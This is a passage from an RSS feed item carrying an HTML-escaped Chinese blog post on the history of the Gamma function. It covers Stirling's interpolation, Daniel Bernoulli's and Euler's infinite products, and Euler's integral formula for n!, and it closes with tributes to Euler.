{\sqrt{2\pi(2n+1)} (\frac{2n+1}{e})^{2n+1}} \\&lt;br&gt;
&amp;amp; = \displaystyle \frac{\sqrt\pi}{2} \cdot \frac{e}{(1+\frac{1}{2n})^{2n}}&lt;br&gt;
\cdot \frac{\sqrt{2n+2}\cdot 2n}{\sqrt{2n+1}\cdot (2n+1)} \\&lt;br&gt;
&amp;amp; \rightarrow \frac{\sqrt\pi}{2} \hspace{0.5cm} (n \rightarrow \infty) .&lt;br&gt;
\end{align*}&lt;/p&gt;
&lt;p style=&quot;text-align: center;&quot;&gt;&lt;a href=&quot;http://www.flickering.cn/wp-content/uploads/2014/06/stirling_grave.jpg&quot;&gt;&lt;img class=&quot;alignnone size-medium wp-image-178&quot; src=&quot;http://www.flickering.cn/wp-content/uploads/2014/06/stirling_grave-300x225.jpg&quot; alt=&quot;stirling_grave&quot; width=&quot;300&quot; height=&quot;225&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p style=&quot;text-align: center;&quot;&gt;斯特林的墓&lt;/p&gt;
&lt;p&gt;斯特林的插值研究成果发表于他1730年出版的《Methodus Differentialis》中，由于原书是拉丁文写成的，有人把他翻译成了英文，并对斯特林的研究成果提供了很多的评论，使得我们有机会追寻斯特林研究的原始足迹。 有了强大的斯特林公式，可以对$n!$ 进行便捷的近似计算， 而事实上按照斯特林的插值思路，他已经可以近似计算$n$为任何分数的时候的阶乘。然而斯特林的思路更多只是停留在数值近似计算上，没有把 $n!$ 到分数的延拓更细致地追究下去。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;三、三封信—伽玛函数的诞生&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;和斯特林处在同一个时代的另外一位数学家几乎在同一个时间点也在考虑 $n!$ 的插值问题，这个人就是哥德巴赫。哥德巴赫的名字在中国真是家喻户晓。由于中国数学家在数论领域的杰出成就，和素数相关的哥德巴赫猜想作为数学皇冠上的明珠就一直吸引着无数中国人的目光。 哥德巴赫一生都对数列的插值问题保持浓厚的兴趣，他很早就开始考虑阶乘的插值问题。不过看起来哥德巴赫的思路不同于斯特林，他并不满足于仅仅做近似的数值计算，他希望能找到一个通项公式，既可以准确的描述$n!$, 又能够同时推广到分数情形。不过哥德巴赫无法解决这个问题，幸运的是哥德巴赫交友广泛，和当时许多著名的数学家都有联系，包括莱布尼茨以及数学史中出了最多位数学家的家族— 贝努利家族。1722 年他找尼古拉斯·贝努利请教这个阶乘插值问题，不过没有取得任何进展。即便如此，哥德巴赫却多年来一直不忘思考这个问题，1729年他又请教尼古拉斯·贝努利的弟弟丹尼尔·贝努利，而丹尼尔于当年10月给哥德巴赫的一封信中给出了漂亮的解答。&lt;/p&gt;
&lt;p style=&quot;text-align: center;&quot;&gt;&lt;a href=&quot;http://www.flickering.cn/wp-content/uploads/2014/06/goldbach2.jpg&quot;&gt;&lt;img class=&quot;alignnone size-full wp-image-173&quot; src=&quot;http://www.flickering.cn/wp-content/uploads/2014/06/goldbach2.jpg&quot; alt=&quot;goldbach2&quot; width=&quot;200&quot; height=&quot;225&quot;&gt;&lt;/a&gt; &lt;a href=&quot;http://www.flickering.cn/wp-content/uploads/2014/06/Daniel_Bernoulli_by_Grooth.jpg&quot;&gt;&lt;img class=&quot;alignnone  wp-image-168&quot; src=&quot;http://www.flickering.cn/wp-content/uploads/2014/06/Daniel_Bernoulli_by_Grooth-243x300.jpg&quot; alt=&quot;Daniel_Bernoulli_by_Grooth&quot; width=&quot;185&quot; height=&quot;229&quot;&gt;&lt;/a&gt;&lt;br&gt;
哥德巴赫和丹尼尔·贝努利&lt;/p&gt;
&lt;p&gt;丹尼尔解决阶乘插值问题的思路非常漂亮：突破有限，取道无穷！他不拘泥于有限的方式，而是直接跳跃到无穷乘积的形式做插值。丹尼尔发现，如果 $m,n$都是正整数，当 $m&lt;br&gt;
\rightarrow \infty$时，有&lt;br&gt;
$$ \frac{1\cdot 2\cdot 3 \cdots m}{(1+n)(2+n)\cdots (m-1+n)}(m+\frac{n}{2})^{n-1}&lt;br&gt;
\rightarrow n! .$$&lt;br&gt;
于是利用这个无穷乘积的方式可以把$n!$的定义自然地延拓到实数集。例如，取 $n=2.5$, $m$ 足够大，基于上式就可以近似计算出 $2.5!$。我们并不知道丹尼尔是如何想到用无穷乘积的思路去解决这个问题的，然而他能从有限插值跳跃到无穷，足以显示他优秀的数学才能。无穷在整个数学发展中发挥着巨大的作用，二十世纪之后的数学笔者不敢妄加评论，然而如果说“无穷是数学发展的发动机”，在二十世纪之前，这句评论应该不会过分。历次数学危机是因为无穷而产生，几次数学的重大进展和飞跃也是由于数学家们更加深刻地认识了无穷。&lt;/p&gt;
&lt;p&gt;接下来伽马函数的主角欧拉要登场了。欧拉和贝努利家族有紧密的联系，他是约翰·贝努利 (Johann Bernoulli, 1667-1748)的学生， 这位约翰也就是尼古拉斯和丹尼尔的父亲。我们应该感谢约翰·贝努利，因为正是他发现并培养了欧拉的数学才能。 在尼古拉斯和丹尼尔的推荐之下欧拉于1727年在圣彼得堡科学院获得了一个职位。欧拉当时正和丹尼尔·贝努利一块在圣彼得堡，他也因此得知了阶乘的插值问题。应该是受到丹尼尔·贝努利的思路的启发，欧拉也采用无穷乘积的方式给出了另外一个$n!$ 的插值公式&lt;br&gt;
\begin{equation}&lt;br&gt;
\label{euler-series}&lt;br&gt;
\Bigl[\Bigl(\frac{2}{1}\Bigr)^n\frac{1}{n+1}\Bigr]&lt;br&gt;
\Bigl[\Bigl(\frac{3}{2}\Bigr)^n\frac{2}{n+2}\Bigr]&lt;br&gt;
\Bigl[\Bigl(\frac{4}{3}\Bigr)^n\frac{3}{n+3}\Bigr] \cdots = n! .&lt;br&gt;
\end{equation}&lt;br&gt;
用极限形式，这个式子以写为&lt;br&gt;
\begin{equation}&lt;br&gt;
\label{euler-series2}&lt;br&gt;
\lim_{m \rightarrow \infty} \frac{1\cdot 2\cdot 3 \cdots m}{(1+n)(2+n)\cdots (m+n)}(m+1)^{n} = n!&lt;br&gt;
\end{equation}&lt;br&gt;
欧拉实际上在他的论文中描述了发现上述式子的思路，我们不在此赘述，不过上式成立却很容易证明。上式左边可以整理为&lt;br&gt;
\begin{align*}&lt;br&gt;
&amp;amp; \frac{1\cdot 2\cdot 3 \cdots m}{(1+n)(2+n)\cdots (m+n)}(m+1)^{n} \\&lt;br&gt;
= &amp;amp; \frac{1\cdot 2\cdot 3 \cdots n \cdot (n+1)(n+2) \cdots m}{(1+n)(2+n)\cdots m (m+1)(m+2)\cdots (m+n)}&lt;br&gt;
(m+1)^{n} \\&lt;br&gt;
= &amp;amp; 1\cdot 2\cdot 3 \cdots n \cdot \frac{(n+1)(n+2) \cdots m}{(1+n)(2+n)\cdots m }&lt;br&gt;
\cdot \frac{(m+1)^{n}}{(m+1)(m+2)\cdots (m+n)} \\&lt;br&gt;
= &amp;amp; n! \cdot \frac{(m+1)^{n}}{(m+1)(m+2)\cdots (m+n)} \\&lt;br&gt;
= &amp;amp; n! \cdot \prod_{k=1}^{n} \frac{m+1}{m+k} \\&lt;br&gt;
\rightarrow &amp;amp; n! \qquad (m\rightarrow \infty)&lt;br&gt;
\end{align*}&lt;br&gt;
所以 \eqref{euler-series}、\eqref{euler-series2}式都成立。&lt;/p&gt;
&lt;p&gt;而由于\eqref{euler-series} 式对于$n$为分数的情形也适用，所以欧拉实际上也把$n!$ 的计算推广到了分数的情形，只是这个计算是用无穷乘积的形式表示的，看起来不够直观。欧拉给的无穷乘积相比丹尼尔的无穷乘积有什么更出色的地方吗？实际上后人的验证指出，就收敛到$n!$的速度而言，丹尼尔的无穷乘积比欧拉的要快得多，然而欧拉的无穷乘积公式却是能够下金蛋的。 欧拉尝试从一些简单的例子开始做计算，看看是否有规律可循，欧拉极其擅长数学的观察与归纳。当 $n=\frac{1}{2}$ 的时候，带入\eqref{euler-series} 式，可以得到&lt;br&gt;
\begin{align*}&lt;br&gt;
\Bigl(\frac{1}{2}\Bigr)!&lt;br&gt;
= &amp;amp; \sqrt{\frac{2}{1}} \cdot \frac{2}{3} \cdot \sqrt{\frac{3}{2}} \cdot \frac{4}{5}&lt;br&gt;
\cdot \sqrt{\frac{4}{3}} \cdot \frac{6}{7} \cdot \sqrt{\frac{5}{4}} \cdot \frac{8}{9}&lt;br&gt;
\cdot \cdots \\&lt;br&gt;
= &amp;amp; \sqrt{\frac{4}{2}} \cdot \frac{2}{3} \cdot \sqrt{\frac{6}{4}} \cdot \frac{4}{5}&lt;br&gt;
\cdot \sqrt{\frac{8}{6}} \cdot \frac{6}{7} \cdot \sqrt{\frac{10}{8}} \cdot \frac{8}{9}&lt;br&gt;
\cdot \cdots \\&lt;br&gt;
= &amp;amp; \sqrt{\frac{4}{3} \cdot \frac{2}{3}} \cdot \sqrt{\frac{6}{5} \cdot \frac{4}{5}}&lt;br&gt;
\cdot \sqrt{\frac{8}{7} \cdot \frac{6}{7}} \cdot \sqrt{\frac{10}{9} \cdot \frac{8}{9}}&lt;br&gt;
\cdot \cdots \\&lt;br&gt;
= &amp;amp; \sqrt{\frac{2}{3} \cdot \frac{4}{3} \cdot \frac{4}{5} \cdot \frac{6}{5}&lt;br&gt;
\cdot \frac{6}{7} \cdot \frac{8}{7} \cdot \frac{8}{9} \cdot \frac{10}{9} \cdot \cdots }&lt;br&gt;
\end{align*}&lt;br&gt;
对比一下根号内的式子和沃利斯公式\eqref{wallis-formula}，几乎是一模一样，只是最前面差了一个因子2。 欧拉自然非常熟悉沃利斯的工作，基于沃利斯公式，欧拉迅速得到了如下一个令他惊讶的结果&lt;br&gt;
$$ \Bigl(\frac{1}{2}\Bigr)! = \frac{\sqrt{\pi}}{2} .$$&lt;/p&gt;
&lt;p style=&quot;text-align: center;&quot;&gt;&lt;a href=&quot;http://www.flickering.cn/wp-content/uploads/2014/06/euler-swiss-banknote.jpg&quot;&gt;&lt;img class=&quot;alignnone wp-image-170 size-large&quot; src=&quot;http://www.flickering.cn/wp-content/uploads/2014/06/euler-swiss-banknote-1024x497.jpg&quot; alt=&quot;euler-swiss-banknote&quot; width=&quot;604&quot; height=&quot;293&quot;&gt;&lt;/a&gt;&lt;br&gt;
瑞士法郎上的欧拉&lt;/p&gt;
&lt;p&gt;欧拉给的无穷乘积满足阶乘的递归式$T(z) = z T(z-1)$, 结合递归式和计算技巧欧拉还计算了其它几个分数，包括 $\frac{5}{2}, \frac{1}{4}, \frac{3}{4}, \frac{1}{8}, \frac{3}{8} $ 等分数的阶乘。在丹尼尔的鼓励之下，欧拉把自己的插值公式以及一些分数阶乘的计算结果写信告知了哥德巴赫，这开启了欧拉和哥德巴赫之间一生的通信交流。两人在接下来的 35 年里连续通信达到196封，这些信函成为了数学家们研究欧拉的重要资料，而著名的哥德巴赫猜想就是首次出现在哥德巴赫写给欧拉的一封信中，也正是哥德巴赫激发了欧拉对数论的兴趣。&lt;/p&gt;
&lt;p style=&quot;text-align: left;&quot;&gt;欧拉是具有超凡的数学直觉的数学家，他看到 $ (\frac{1}{2})!$ 中居然有 $\pi$, 对于擅长数学分析的数学家而言，有 $\pi$ 的地方必然有和圆相关的积分。同时由于计算$ (\frac{1}{2})!$ 过程中使用到的沃利斯公式，实际上也是计算积分的产物，由此欧拉猜测 $n!$ 应该可以表达为积分形式，于是欧拉开始努力尝试把 $n!$ 表达为某种积分。虽然沃利斯的时代微积分的系统理论还没有发明出来，沃利斯使用插值的方式做一些推导计算，但是沃利斯公式的推导过程本质上就是在处理积分。 如果说沃利斯当年只是无心插柳，那后继者欧拉是发现了一片绿洲。 受沃利斯工作的启发，欧拉开始考虑如下一般形式的积分&lt;br&gt;
$$ J(e,n) = \int_0^1 x^e(1-x)^ndx$$&lt;br&gt;
此处 $n$ 为正整数，$e$ 为正实数。利用分部积分法，很容易证明&lt;br&gt;
$$ J(e,n) = \frac{n}{e+1}J(e+1,n-1) $$&lt;br&gt;
重复使用上述迭代公式，最终可以得到&lt;br&gt;
$$ J(e,n) = \frac{1\cdot2\cdots n}{(e+1)(e+2)\cdots(e+n+1)} $$&lt;br&gt;
于是欧拉得到如下一个重要的式子&lt;br&gt;
\begin{equation}&lt;br&gt;
n! = (e+1)(e+2)\cdots(e+n+1)\int_0^1 x^e(1-x)^ndx&lt;br&gt;
\end{equation}&lt;br&gt;
在这个公式里欧拉实际上已经成功地把$n!$ 表示成了积分的形式。然而这里的问题是 $(e+1)(e+2)\cdots(e+n+1)$ 这个表达式限制了 $n$ 只能为整数，无法推广到分数的情形，欧拉继续研究能否简化这个积分表达式。此处$e$ 是一个任意实数，有没有办法让$e$ 从上面的积分式子中消失呢？要让一个量从一个数学等式中消失，数学家们惯用的手法之一就是让这个量取一个极端的值，譬如无穷。欧拉的老师约翰·贝努利说过“无穷是上帝的属性”，在通往无穷的路途中，造物主的秘密往往被数学家们窥视。欧拉开始追问：如果让$e$ 趋向于无穷取值，会发生什么样的情况呢？分析学的大师欧拉开始展现他的计算技巧，取$e=\frac{f}{g}$, 稍微整理一下可以得到&lt;br&gt;
$$ \frac{n!}{(f+g)(f+2g)\cdots(f+ng)} = \frac{f+(n+1)g}{g^{n+1}} \int_0^1 x^\frac{f}{g}(1-x)^n dx $$&lt;br&gt;
然后令 $f \rightarrow 1, g \rightarrow 0$，显然上式左边趋于$n!$, 右边会发生什么情况呢？为了简化计算，令 $x=t^h, h=\frac{g}{f+g}$， 整理之后上式可以变换为&lt;br&gt;
\begin{align}&lt;br&gt;
\frac{n!}{(f+g)(f+2g)\cdots(f+ng)}&lt;br&gt;
&amp;amp; = \frac{f+(n+1)g}{g^{n+1}} \int_0^1 h(1-t^h)^n dt \notag \\&lt;br&gt;
&amp;amp; = \frac{f+(n+1)g}{(f+g)^{n+1}} \int_0^1 \Bigl(\frac{1-t^h}{h}\Bigr)^n dt&lt;br&gt;
\label{factorial-integral}&lt;br&gt;
\end{align}&lt;br&gt;
当$f \rightarrow 1, g \rightarrow 0$ 时显然有$h \rightarrow 0$，利用罗必塔法则，我们可以得到微积分中一个熟知的式子&lt;br&gt;
$$ \lim_{h \rightarrow 0} \frac{1-t^h}{h} = -\log t .$$&lt;br&gt;
于是对 \eqref{factorial-integral} 式两边取极限，奇迹出现了&lt;br&gt;
\begin{equation}&lt;br&gt;
\label{factorial-gamma-1}&lt;br&gt;
n! = \int_0^1 (-\log t)^ndt,&lt;br&gt;
\end{equation}&lt;br&gt;
原来的积分式中的$e$消失了，欧拉成功地把$n!$表达为了一个非常简洁的积分形式！！！对上式再做一个变换 $t=e^{-\lambda}$,就可以得到我们常见的伽玛函数形式&lt;br&gt;
\begin{equation}&lt;br&gt;
\label{factorial-gamma-2}&lt;br&gt;
n! = \int_0^{\infty} \lambda^ne^{-\lambda}d\lambda .&lt;br&gt;
\end{equation}&lt;br&gt;
把\eqref{factorial-gamma-1}和\eqref{factorial-gamma-2} 式从整数$n$ 延拓到任意实数$x$(包括负数)，我们就得到伽玛函数的一般形式&lt;br&gt;
$$ \Gamma(x+1) = \int_0^1 (-\log t)^{x}dt = \int_0^{\infty} t^{x}e^{-t}dt .$$&lt;br&gt;
1730年 欧拉把他推广得到的$n!$的积分形式再次写信告知了哥德巴赫，由此完美地解决了困恼哥德巴赫多年的插值问题，同时正式宣告了伽马函数在数学史的诞生，当时欧拉只有23岁。&lt;/p&gt;
&lt;p style=&quot;text-align: center;&quot;&gt;&lt;a href=&quot;http://www.flickering.cn/wp-content/uploads/2014/06/gamma-func.png&quot;&gt;&lt;img class=&quot;alignnone size-medium wp-image-187&quot; src=&quot;http://www.flickering.cn/wp-content/uploads/2014/06/gamma-func-300x211.png&quot; alt=&quot;gamma-func&quot; width=&quot;300&quot; height=&quot;211&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p style=&quot;text-align: center;&quot;&gt;$\Gamma(x)$ 在正半轴的图像&lt;/p&gt;
&lt;p&gt;虽然会有一些争议，有不少数学人把数学家排名中的头两把交椅划给了欧拉和高斯。欧拉和高斯都是具有超凡直觉的一流数学家，但是欧拉和高斯的风格迥异。高斯是个老狐狸，数学上非常严谨，发表结果的时候却都把思考的痕迹抹去，只留下漂亮的结果，这招致了一些数学家对高斯的批评。而欧拉的风格不同，他的做法是把最基本的东西解释得尽量清楚，讲明引导他得出结论的思路，经常通过经验直觉做大胆的猜测，他的文章中往往留下了做数学猜想的痕迹。 拉普拉斯曾说过：“读读欧拉 ,他是我们所有人的老师。”高斯的评价是：“学习欧拉的著作，乃是认识数学的最好工具。”数学家波利亚在他的名著《数学与猜想》中列举了许多欧拉做数学研究的例子，对欧拉做数学归纳和猜想的方式推崇备至。&lt;/p&gt;
&lt;p style=&quot;text-align: center;&quot;&gt;&lt;a href=&quot;http://www.flickering.cn/wp-content/uploads/2014/06/euler_cup.jpg&quot;&gt;&lt;img class=&quot;alignnone size-full wp-image-169&quot; src=&quot;http://www.flickering.cn/wp-content/uploads/2014/06/euler_cup.jpg&quot; alt=&quot;euler_cup&quot; width=&quot;282&quot; height=&quot;275&quot;&gt;&lt;/a&gt;&lt;br&gt;
欧拉的数学发现&lt;/p&gt;
&lt;p&gt;欧拉被称为分析学的化身，在分析学中，无出其右者。欧拉的老师约翰·贝努利在给欧拉的信中这样评价欧拉的工作：“ 我介绍高等分析的时候，它还是个孩子，而你正在将它带大成人。” 希尔伯特说“分析学是无穷的交响曲”，欧拉显然是无穷分析中最出色的作曲家。欧拉二百多年前写的教科书《无穷分析引论》至今还在不断地印刷，最近也刚刚出版了中文翻译版本。布尔巴基学派的灵魂人物韦伊( Andr\’{e} Weil, 1906-1998) 1979 年在 Rochester大学的一次讲演中说：“今天的学生从欧拉的《无穷分析引论》中所能得到的益处，是现代的任何一本数学教科书都比不上的。”&lt;/p&gt;
&lt;p&gt;许多人把数学比作音乐，把欧拉称作数学界的贝多芬。因为贝多芬在两耳失聪之后继续谱写了大量著名的交响曲，而欧拉在60岁左右双目失眠之后仍然以口述形式完成了几本书和 400 多篇论文，在数学上变得更加多产。 数学界从1911年开始出版《欧拉全集》，耗费了一个世纪的时间，已经出版了70余卷， 25000多页， 而这项庞大的出版任务还仍处于未完成状态。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.flickering.cn&quot;&gt;&lt;img class=&quot;aligncenter&quot; src=&quot;http://www.flickering.cn/logo/flickering-logo.png&quot; alt=&quot;火光摇曳&quot; width=&quot;201&quot; height=&quot;217&quot;&gt;&lt;/a&gt;&lt;/p&gt;

											

</description>
        <pubDate>Mon, 30 Jun 2014 00:00:00 +0800</pubDate>
        <link>http://iftti.com/posts/2014/2014-06-30-%25e7%25a5%259e%25e5%25a5%2587%25e7%259a%2584%25e4%25bc%25bd%25e7%258e%259b%25e5%2587%25bd%25e6%2595%25b0%25e4%25b8%258a-d49d593f9.html</link>
        <guid isPermaLink="true">http://iftti.com/posts/2014/2014-06-30-%25e7%25a5%259e%25e5%25a5%2587%25e7%259a%2584%25e4%25bc%25bd%25e7%258e%259b%25e5%2587%25bd%25e6%2595%25b0%25e4%25b8%258a-d49d593f9.html</guid>
        
        
      </item>
    
  </channel>
</rss>
